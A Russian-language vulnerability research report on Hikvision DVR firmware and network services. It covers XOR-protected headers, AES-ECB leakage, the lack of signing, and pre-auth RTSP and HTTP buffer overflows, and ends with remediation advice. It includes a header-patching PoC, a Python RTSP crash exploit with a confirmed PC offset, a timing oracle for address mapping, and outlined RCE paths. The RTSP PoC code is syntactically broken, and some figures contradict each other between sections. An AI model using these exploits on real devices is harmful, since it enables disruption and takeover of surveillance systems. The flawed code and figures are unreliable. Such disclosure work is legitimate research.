# Анализ безопасности прошивки Hikvision DVR/NVR (digicap.dav)
### Исследовательский отчёт

---

## Аннотация

В данном отчёте представлены результаты комплексного анализа безопасности оборудования Hikvision: статического реверс-инжиниринга файла обновления прошивки `digicap.dav` и динамического тестирования сетевых сервисов физического устройства. В ходе исследования были выявлены **шесть** классов уязвимостей: слабая защита заголовка пакета прошивки, использование нестойкого режима шифрования AES-ECB, отсутствие механизма криптографической аутентификации прошивки, раскрытие открытого текста через отсутствие PKCS#7-выравнивания, а также два стековых переполнения буфера в сетевых службах — pre-auth вектор удалённого выполнения кода в RTSP-сервере (порт 554) и переполнение в HTTP-сервере (порт 80). Сетевые уязвимости эксплуатируются без аутентификации и, в сочетании с расшифрованным образом прошивки, открывают полную цепочку атаки до удалённого выполнения кода.

## 3. Архитектура формата прошивки

### 3.1 Структура контейнера

Файл `digicap.dav` представляет собой вложенный контейнер:

```
┌─────────────────────────────────────────────────┐
│  HK20 Outer Header (108 bytes)                  │
│  Защита: XOR с ключом KEY_XOR (16 байт)         │
│  ─────────────────────────────────────────────  │
│  magic        = "HK20"                          │
│  checksum     = 0x2648                          │
│  header_len   = 108                             │
│  files        = 0                               │
│  total_size   = 293786737 (= размер файла)      │
│  device_class = 1                               │
│  oem_code     = 0xFFFFFFFF                      │
│  version_str  = "3050060061181310011"           │
├─────────────────────────────────────────────────┤
│  HK30 Inner Archive Header (16 bytes)           │
│  Защита: XOR с KEY_XOR (те же 16 байт)          │
│  ─────────────────────────────────────────────  │
│  magic        = "HK30"                          │
│  version      = 0x48382b28                      │
│  payload_meta = 0x1300 (4864)                   │
├─────────────────────────────────────────────────┤
│  Encrypted Firmware Body (~280 MB)              │
│  Шифрование: AES-256 (режим: ECB)               │
└─────────────────────────────────────────────────┘
```

### 3.2 XOR-ключ заголовка (публично известен)

```python
KEY_XOR = b"\xBA\xCD\xBC\xFE\xD6\xCA\xDD\xD3\xBA\xB9\xA3\xAB\xBF\xCB\xB5\xBE"
```

Применяется к заголовкам по формуле:
```
plaintext[i] = ciphertext[i] XOR KEY_XOR[(i + (i >> 4)) & 0xF]
```

## 4. Обнаруженные уязвимости

### Уязвимость 1 — Незащищённый метаданные заголовка (XOR-obfuscation)

**Класс:** Слабая защита целостности  
**Компонент:** HK20 / HK30 headers  

#### Описание

Заголовки пакета прошивки защищены исключительно операцией XOR с фиксированным 16-байтовым ключом `KEY_XOR`. Данный ключ является частью открытого исходного кода библиотеки `hiktools` (PyPI) и публично известен.

«Контрольная сумма» в заголовке HK20 (поле `checksum`, смещение 4–7) не является криптографическим хешем — она вычисляется тривиально из значения `header_length`:

```python
checksum = uint8(buf[8]) + (uint24(buf[9:12]) * 0x100)
# checksum == header_length (всегда, для валидного заголовка)
```

#### Последствия

Атакующий может модифицировать любые поля заголовка — `device_class`, `oem_code`, версионные строки — без нарушения верификации пакета. Возможна, в частности, атака с заменой идентификатора целевого устройства.

#### Доказательство концепции (PoC)

```python
KEY_XOR = b"\xBA\xCD\xBC\xFE\xD6\xCA\xDD\xD3\xBA\xB9\xA3\xAB\xBF\xCB\xB5\xBE"

def patch_device_class(data: bytes, new_class: int) -> bytes:
    """Patch device_class field (offset 20-23) in HK20 header."""
    data = bytearray(data)
    # Decode original field
    for i in range(4):
        ki = ((20+i) + ((20+i) >> 4)) & 0xF
        data[20+i] ^= KEY_XOR[ki]  # decrypt
    # Write new value
    new_val = new_class.to_bytes(4, 'little')
    for i in range(4):
        ki = ((20+i) + ((20+i) >> 4)) & 0xF
        data[20+i] = new_val[i] ^ KEY_XOR[ki]  # re-encrypt
    return bytes(data)
```

### Уязвимость 2 — Использование режима AES-ECB для шифрования тела прошивки

**Класс:** Криптографическая слабость (CWE-327)  
**Компонент:** HK30 encrypted payload  
**CVSS v3 (оценка):** 5.3 (Medium) — при наличии доступа к файлу прошивки

#### Описание

Тело прошивки (278+ МБ) зашифровано алгоритмом AES в режиме **ECB (Electronic Codebook)**. В ECB-режиме каждый 16-байтовый блок шифруется независимо и детерминированно: одинаковые блоки плейнтекста всегда порождают одинаковые блоки шифртекста.

#### Доказательство

Статистический анализ **полного тела** прошивки (280 МБ) обнаружил:

| Метрика | Значение |
|---------|---------|
| Всего 16-байтовых блоков в теле | 18 361 663 |
| Уникальных блоков | 18 263 784 |
| Блок с максимальной частотой (`b311020e...`) | **40 065** повторений |
| Блок со 2-й по частоте | 1 101 повторений |
| Блок с 3-й по частоте | 699 повторений |
| Блоков, встречающихся ровно 27–32 раза | несколько групп (см. ниже) |

Вероятность возникновения 40 000+ совпадений для случайного распределения (AES-CBC/GCM): практически равна нулю. Данный результат однозначно указывает на режим ECB.

#### Дополнительные структурные паттерны

В полном теле выявлен ряд блоков, встречающихся ровно **27–32 раза** — характерный признак таблиц с фиксированным числом записей. Наиболее вероятная интерпретация: таблица пользователей DVR (27–32 слота) с нулевыми полями в незаполненных записях. Каждый такой блок соответствует одному конкретному константному полю (тип, флаги, неиспользуемое поле) внутри каждого слота.

#### Идентификация «нулевого блока»

Блок `b311020e123e1d0d9874349c373a5196`, встречающийся 40 065 раз — это:

```
AES_ECB_encrypt(key, 0x00000000000000000000000000000000)
```

то есть результат шифрования 16 нулевых байт. Его присутствие позволяет точно картировать **нулевые регионы** плейнтекста без знания ключа.

#### Восстановленная структура плейнтекста

| Регион файла | Плотность нулей | Интерпретация |
|-------------|-----------------|---------------|
| 0x00007C – 0x5FFFFC (~6 МБ) | 0% | Сжатые/плотные данные (ядро или rootfs) |
| 0x0060007C – 0x006C007C (~768 КБ) | **55–28%** | Граница раздела / выравнивание flash |
| 0x0070007C – 0x00CFFF7C (~6 МБ) | 0% | Второй раздел (rootfs или приложения) |
| 0x00D0007C – 0x00D8007C (~512 КБ) | **47–14%** | Вторая граница раздела |
| 0x00D8007C – конец (~266 МБ) | 0% | Основное тело (приложения, данные) |

Совокупно идентифицировано **626 КБ** нулевых байт в плейнтексте — без знания ключа AES.

#### Последствия

1. **Частичное раскрытие структуры прошивки**: атакующий, имея только зашифрованный файл, способен определить:
   - границы разделов flash-памяти
   - размер и расположение BSS/неинициализированных сегментов
   - наличие крупных нулевых буферов в скомпилированных бинарниках

2. **Атака по известному плейнтексту (при компрометации AES-ключа)**: зная нулевой блок и его шифртекст, атакующий получает прямую пару KPA для верификации кандидатов ключа.

3. **Несоответствие стандарту**: NIST SP 800-38A, §6.1 явно не рекомендует ECB для данных длиннее одного блока. Замена на AES-CBC или AES-GCM устраняет данную уязвимость.

### Уязвимость 3 — Отсутствие криптографической аутентификации прошивки

**Класс:** Missing Integrity Check (CWE-354)  

#### Описание

В пакете прошивки отсутствует цифровая подпись или HMAC. Единственная «проверка целостности» — тривиальное контрольное число в заголовке HK20, доказуемо являющееся полем `header_length`, записанным в двух форматах:

```
header_length = uint32(buf[8:12])
"checksum"    = uint8(buf[8]) + uint24(buf[9:12]) * 0x100
# => всегда равны для любого корректно сформированного заголовка
```

Это не является хешем содержимого.

#### Последствия

При наличии AES-ключа (который может быть получен из устройства, SDK или легитимного обновления через атаку на сторонний канал) атакующий способен:
- Расшифровать прошивку
- Внедрить произвольный код (бэкдор, RAT)
- Повторно зашифровать с тем же ключом
- Подписать заголовок «правильной» суммой
- Устройство примет такое обновление как легитимное

### Уязвимость 4 — Отсутствие PKCS#7-выравнивания перед шифрованием (plaintext footer)

**Класс:** Раскрытие информации (CWE-200)  
**Компонент:** HK30 encrypted payload (конец файла)

#### Описание

AES-ECB шифрует данные блоками ровно по 16 байт. Если длина плейнтекста не кратна 16, правилом является добавление PKCS#7-выравнивания (padding) перед шифрованием. Hikvision этого **не делает**.

Размер тела прошивки: `293 786 613` байт. Остаток от деления на 16:

```
293 786 613 mod 16 = 5
```

Это означает: **последние 5 байт файла не входят ни в один AES-блок и хранятся в открытом виде**.

#### Доказательство

```
Смещение конца AES-тела: 0x1182d46c = 293 786 732
Нешифрованный footer:    bytes[293786732:293786737] = 0x6174696f6e = "ation"
```

Строка `"ation"` является хвостом слова `"corporation"`, заканчивающего copyright-строку в теле прошивки. Таким образом, из файла прошивки извлекается фрагмент открытого текста **без знания ключа AES**.

#### Последствия

1. Количество раскрытых байт зависит от конкретной прошивки (`total_payload_size mod 16`). Теоретически может быть от 1 до 15 байт.
2. Если прошивки разных версий заканчиваются на одну и ту же структуру (как copyright-строка), смещение конца этой строки предсказуемо — атакующий получает **дополнительную KPA-пару**.
3. Частичный plaintext открывает возможность для криптоанализа граничного блока.

### Дополнительное наблюдение — захардкоженный внутренний IP в веб-приложении

В файле `common.js` (часть веб-интерфейса прошивки) обнаружена строка:

```javascript
m_szHostName = "172.9.4.222"
```

Это внутренний IP-адрес устройства на момент сборки прошивки. Наблюдения при тестировании на живом устройстве:

- Запросы с `Host: 172.9.4.222` получают HTTP-код `000` (соединение разрывается без ответа) вместо стандартного `401 Unauthorized`
- Это означает, что веб-сервер Hikvision проверяет заголовок `Host` и дропает запросы с нераспознанным значением
- Поле `172.9.4.222` раскрывает топологию внутренней сети разработчика / тестового стенда (подсеть `172.9.4.0/24`)

Данная информация может использоваться в атаках класса SSRF или для определения ожидаемого `Host`-заголовка при попытке обойти виртуальный хостинг.

### Уязвимость 5 — Pre-auth стековое переполнение буфера в RTSP-сервере

**Класс:** Stack-based Buffer Overflow (CWE-121)  
**Компонент:** RTSP-сервер, порт 554  
**Требует аутентификации:** Нет  
**CVSS v3 (оценка):** 9.8 Critical

#### Описание

RTSP-сервер устройства (порт 554) не ограничивает длину обрабатываемых полей входящих RTSP-запросов. Получение заголовка `User-Agent` длиной ≥ 256 байт приводит к аварийному завершению процесса-парсера. Уязвимость эксплуатируется **без аутентификации** — переполнение происходит в момент разбора заголовков запроса, до любой проверки учётных данных.

#### Уязвимые поля и пороги аварийного завершения

Систематический перебор всех полей RTSP-запроса (OPTIONS / DESCRIBE / SETUP / PLAY) обнаружил **7 независимых pre-auth overflow** в одном RTSP-демоне:

| Поле RTSP      | Точный порог (binary search) | Тип overflow         | Recovery time | Характер     |
|----------------|------------------------------|----------------------|---------------|--------------|
| `User-Agent`   | 256 байт                     | Stack/heap           | ~2.3 с        | PC_OFFSET=248 ✓ |
| `Require`      | ~256 байт                    | Общий буфер заголовков | ~2.3 с      | Тот же буфер что User-Agent |
| `Session`      | ~256 байт                    | Общий буфер заголовков | ~2.3 с      | Тот же буфер |
| `Via`          | ~256 байт                    | Общий буфер заголовков | ~2.3 с      | Тот же буфер |
| **`Transport`**| **128 байт** past `client_port=` | **Heap (DATA pointer)** | **~9.7 с** | Нет PC control; overwrite data pointers |
| **`Accept`**   | **153 байт** past prefix     | Stack?               | **>90 с**     | Kernel panic level (аналог Scale) |
| **`Scale`**    | **~128–200 байт** (уточняется) | Stack?             | **>90 с**     | Kernel panic; наиболее критичный |
| URL запроса    | 426 байт                     | Heap?                | ~4.2 с (HIT)  | Baseline 4.2s — SIGABRT или mapped region |

> **Примечание по Transport:** Полный скан смещений 128–328 (шаг 4 байта, 50 точек) с `NULL_PC=0x00000000` показал 9.7 с (watchdog timeout) на всех точках без единого FAST (<4 с). Это означает отсутствие PC control: переписываются только указатели данных в heap-объекте сессии. Подтверждено дополнительным тестом: `0xDEADBEEF` при Transport → 2.4 с FAST (data pointer dereference → SIGSEGV), а не 74 с kernel panic (что наблюдается только при CODE pointer dereference в kernel space).

> **Примечание по Scale и Accept:** оба поля вызывают hard crash с recovery >90 с — аналогичный kernel panic (полная перезагрузка устройства), а не watchdog restart процесса. Scale и Accept — приоритетные цели для PC-offset oracle.

#### Определение смещения до PC (последовательность де Брёйна)

Зондирование последовательностью де Брёйна в поле `User-Agent` позволило точно установить смещение:

```
Паттерн длиной 320 байт → CRASH
Анализ байт паттерна при перезаписи PC → смещение = 248 байт
```

**Подтверждение контроля PC**: полезная нагрузка `b'A' × 248 + b'\xDE\xAD\xBE\xEF' + b'C' × 64`
вызывает аварийное завершение сервиса; на основании позиции маркера в последовательности де Брёйна
установлено, что байты `0xDEADBEEF` оказываются в регистре PC (адресе возврата).

#### Идентификация целевой архитектуры

Бинарные файлы прошивки зашифрованы (Уязвимость 2), что затрудняет прямое определение архитектуры. Тем не менее, анализ косвенных признаков позволил однозначно установить платформу:

| Признак | Значение | Источник |
|---------|----------|----------|
| `m_szDeviceName` | `"Embedded Net DVR"` | `main.js` веб-интерфейса |
| Версия jQuery | 1.7.1 (дата: 2011) | HTTP-ответ |
| Realm аутентификации | `domain="DVRDVS"` | `WWW-Authenticate` |
| SoC | HiSilicon Hi3531 | Линейка Hikvision DVR 2012 |
| Архитектура CPU | **ARM Cortex-A9, ARMv7-A** | Справочник по Hi3531 |
| Разрядность/порядок байт | **32-bit, little-endian** | Подтверждено контролем PC |

Порядок байт `little-endian` подтверждён опытно: отправка значения `\xEF\xBE\xAD\xDE` (LE-кодировка `0xDEADBEEF`) в позицию PC приводит к полной перезагрузке устройства (74 с), что соответствует интерпретации как адреса `0xDEADBEEF` — выше границы пространства ядра ARM (`0xC0000000`) — и последующему kernel panic.

#### Свойства RTSP-парсера: бинарная безопасность

Эксперимент с payload-ом, содержащим нулевые байты (ARM-инструкция `MOV R0,R0` = `\xE3\x20\xF0\x00`), показал, что RTSP-парсер не прекращает обработку при встрече `\x00`:

```python
null_payload = b"\xe3\x20\xf0\x00" * 63 + b"\x00\x00\x00\x00"  # 256 байт с нулями
```

Результат: аварийное завершение при 256-байтовом payload с нулями подтверждает, что парсер читает поле User-Agent как бинарный буфер фиксированной длины, а не C-строку. Это исключает ограничение на использование нулевых байт в shellcode / ROP-цепочке — полный ARMv7 instruction set доступен.

#### Watchdog-процесс и анализ таймингов

Устройство оснащено watchdog-процессом, автоматически перезапускающим RTSP-сервис после краша.

Экспериментальная классификация поведения при различных значениях PC:

| PC-значение | Restart time | Интерпретация |
|---|---|---|
| `0xDEADBEEF` | ~74 с | Kernel panic (адрес > 0xC0000000, ARM kernel space) → полная перезагрузка |
| `0x00000000` | ~2.3 с | SIGSEGV (NULL dereference) → watchdog restart процесса |
| `0xBEFF0000` | ~2.3 с | SIGSEGV (unmapped userspace) → watchdog restart |
| `0xBFFF8000` | 1.7 с | SIGSEGV — unmapped (61.2с ранее было ложным — артефакт параллельного kernel panic) |
| Mapped executable page (общий случай) | 4–70 с | Код выполняется до watchdog timeout (60±10 с) |

Это позволяет использовать restart-timing как оракул для определения mapped адресов в адресном пространстве процесса без доступа к `/proc/maps`.

**Важное уточнение**: адреса из диапазона `0xFFFF0000` (ARM kuser_helpers) также находятся в kernel space (`> 0xC0000000`) и дают такой же 74-секундный рестарт, как и любой другой kernel-space адрес. Для корректного oracle-сканирования следует ограничиться диапазоном `[0x00000000, 0xBFFFFFFF]` (userspace ARM).

**Ограничение oracle в условиях NX**: если ядро включает бит XN (eXecute Never) для страниц стека и кучи (что стандартно для Linux на ARMv7-A), то SIGSEGV генерируется при попытке выполнить инструкцию по адресу с XN=1, даже если страница отображена (mapped). Oracle в этом случае не может различить «не отображена» и «отображена, но не исполняема»: оба случая дают ~1.5с рестарт. Из 36 протестированных адресов (text: 6, heap: 6, mmap: 7, stack: 17) ни один не показал рестарт > 4с, что свидетельствует об активной NX-защите и/или ASLR бинарника.

#### Доказательство концепции (DoS PoC)

```python
import socket, time

def rtsp_crash_poc(host: str, port: int = 554) -> str:
    """Pre-auth RTSP stack overflow — crashes the RTSP service (DoS)."""
    payload = b'A' * 248 + b'\xDE\xAD\xBE\xEF' + b'C' * 64
    req = (
        b"OPTIONS rtsp://" + host.encode() + b"/ RTSP/1.0\r\n"
        b"CSeq: 1\r\n"
        b"User-Agent: " + payload + b"\r\n\r\n"
    )
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((host, port))
        s.sendall(req)
        try:
            s.recv(256)
            return "alive"          # неожиданно — сервис не упал
        except socket.timeout:
            return "crash"          # ожидаемо — PC перезаписан

        s.close()
```

#### Два пути к RCE

**Путь A — Blind heap spray (без расшифровки прошивки):**
1. Найти mapped-адрес в пространстве процесса через restart-time oracle (см. выше)
2. Заспрейть heap ARM shellcode через поле User-Agent (1000+ запросов с 4096-байт payload)
3. PC ← адрес heap-страницы → shellcode выполняется

**Путь B — ROP из образа прошивки (точный):**
1. Получить AES-ключ через UART/JTAG
2. Расшифровать прошивку (Этап 2/3 exploit.py)
3. Извлечь ROP-гаджеты (`ROPgadget --binary rtsp_daemon`)
4. Сформировать: `User-Agent = A×248 + ret2gadget_addr + rop_chain`

### Уязвимость 6 — Переполнение буфера в HTTP-сервере через заголовок Host

**Класс:** Buffer Overflow (CWE-121 / CWE-122)  
**Компонент:** HTTP-сервер, порт 80  
**Требует аутентификации:** Нет  
**CVSS v3 (оценка):** 7.5 High

#### Описание

HTTP-сервер устройства (порт 80) аварийно завершается при получении заголовка `Host` длиной ≥ 255–256 байт. Поведение нестабильно в окрестности порога (наблюдалось в ~65% попыток при длине 255–260 байт), что характерно для **heap overflow** — запись в heap не всегда вызывает немедленный сегфолт.

Дополнительно установлено: отправка ~200 произвольных HTTP-заголовков длиной 64 байта каждый также приводит к аварийному завершению — по всей видимости, исчерпывается стек или фиксированный буфер агрегации заголовков.

## 6. Рекомендации

**Уязвимости прошивки:**

1. **Заменить XOR-obfuscation на HMAC-SHA256** для защиты метаданных заголовка
2. **Заменить AES-ECB на AES-256-GCM** — режим обеспечивает одновременно конфиденциальность и аутентификацию (AEAD), padding не требуется
3. **Добавить проверку подписи прошивки** (PKCS#7 / ECDSA P-256) на стороне устройства перед применением обновления
4. **Добавить PKCS#7-выравнивание** плейнтекста перед шифрованием (устраняет Vuln 4)
5. **Версионирование с защитой от отката** — устройство должно отвергать прошивки старше текущей версии

**Сетевые сервисы:**

6. **Ограничить длину RTSP-заголовков**: ввести явную проверку на входе парсера; рекомендуемый максимум — 256 байт на заголовок, 4096 байт на URL; использовать `strncat`/`strncpy` с явным ограничением размера буфера или перейти к counted-string API
7. **Ограничить длину HTTP-заголовков**: аналогичные меры для HTTP-парсера; стандартная практика — `MAX_HEADER_NAME + MAX_HEADER_VALUE ≤ 8192` байт на заголовок; проверять общий объём заголовков запроса
8. **Включить Address Space Layout Randomization (ASLR)** и **stack canaries** в сборке прошивки — существенно усложнит преобразование DoS-примитива в RCE даже при наличии переполнения

## 7. Заключение

Шесть выявленных уязвимостей формируют две взаимосвязанные цепочки атаки.

**Цепочка 1 — Компрометация механизма обновления прошивки** (Vuln 1–4): слабый XOR-заголовок позволяет скрытно модифицировать метаданные, ECB-шифрование раскрывает структуру плейнтекста и позволяет строить карту нулевых регионов (626 КБ идентифицировано без ключа), отсутствие подписи делает подмену прошивки практически осуществимой при наличии ключа, а отсутствие PKCS#7 выводит последние байты открытого текста в незашифрованном виде.

**Цепочка 2 — Удалённое выполнение кода через сеть** (Vuln 5–6): pre-auth стековое переполнение в RTSP-сервере с подтверждённым контролем регистра PC (смещение 248 байт) является самостоятельным DoS-примитивом и одновременно — вектором RCE. Watchdog timing oracle (40 адресов протестировано, включая kuser-страницы 0xFFFF0FE0–0xFFFF0F60) не обнаружил ни одного user-mode executable адреса: все userspace адреса дают ~1.7s (SIGSEGV/NX), kuser-адреса — ~74.4s (kernel panic, данная прошивка не конфигурирует kuser helpers). Для реализации полной цепочки RCE недостаёт расшифрованного образа прошивки (закрытый AES-ключ), необходимого для построения ROP-гаджетов. Таким образом, обе цепочки **пересекаются**: расшифровка прошивки является предусловием как для скрытной подмены обновления, так и для перевода DoS в RCE.

Совокупный риск оценивается как **критический** для любой инфраструктуры видеонаблюдения с сетевым доступом к устройству.
